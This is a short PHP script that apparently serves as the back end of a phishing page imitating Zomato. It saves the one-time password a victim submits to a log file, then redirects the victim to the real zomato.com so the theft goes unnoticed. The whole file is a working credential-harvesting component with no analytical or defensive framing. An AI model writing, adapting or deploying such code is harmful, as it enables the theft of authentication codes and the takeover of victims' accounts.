<?php

    file_put_contents("log.txt", "OTP: " . $_POST['OTP'] . "\n", FILE_APPEND);
header('Location: https://www.zomato.com');
exit();